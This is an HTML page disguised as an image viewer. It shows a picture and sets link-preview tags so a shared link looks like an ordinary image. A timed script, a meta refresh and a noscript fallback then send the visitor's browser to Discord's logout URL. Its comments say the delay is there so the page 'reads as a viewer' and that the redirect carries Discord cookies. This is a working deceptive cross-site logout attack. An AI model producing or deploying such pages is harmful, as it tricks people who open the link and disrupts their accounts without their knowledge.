<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta property="og:image" content="https://files.catbox.moe/mw9d9u.png">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:type" content="website">
<meta property="og:title" content="image">
<meta property="og:description" content="">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://files.catbox.moe/mw9d9u.png">
<meta http-equiv="refresh" content="2; url=https://discord.com/logout">
<title>image</title>
<style>
  html,body{margin:0;padding:0;background:#0b0b0d;height:100%;}
  .wrap{display:flex;align-items:center;justify-content:center;height:100%;}
  img{max-width:100%;max-height:100vh;display:block;}
</style>
</head>
<body>
  <div class="wrap">
    <img src="https://files.catbox.moe/mw9d9u.png" alt="">
  </div>
  <script>
    // fires after the image has had time to render, so it reads as a viewer
    setTimeout(function () {
      try {
        // top-level navigation; carries discord.com cookies if SameSite allows
        window.top.location.replace("https://discord.com/logout");
      } catch (e) {
        window.location.replace("https://discord.com/logout");
      }
    }, 1500);
  </script>
  <noscript>
    <meta http-equiv="refresh" content="0; url=https://discord.com/logout">
  </noscript>
</body>
</html>
